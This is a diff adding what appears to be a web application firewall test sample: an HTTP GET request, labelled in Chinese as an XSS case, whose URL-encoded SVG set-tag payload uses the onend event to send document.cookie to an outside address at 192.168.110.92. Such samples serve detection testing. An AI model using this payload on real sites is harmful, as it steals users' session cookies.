@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_set标签_onend事件-06506575
+# 攻击载荷利用了HTML中的set标签和onend属性，触发location.href向恶意地址发送cookie信息。当 svg 动画结束时触发
+GET /?id=%3Csvg%3E%3Cset%20onend=%28location.href=%22http:%2F%2F192.168.110.92:8080%2Findex.jsp%3Fid=%22+document.cookie%29%20attributename=x%20dur=1s%3E&bid=hd_tag_m8mv268e HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv268e
+RM-PRO-Token: 88d69cf62bdb19902a758275b973cdae
+RM-PRO-Time: 1742808554833
+User-Agent: curl/7.83.1
+
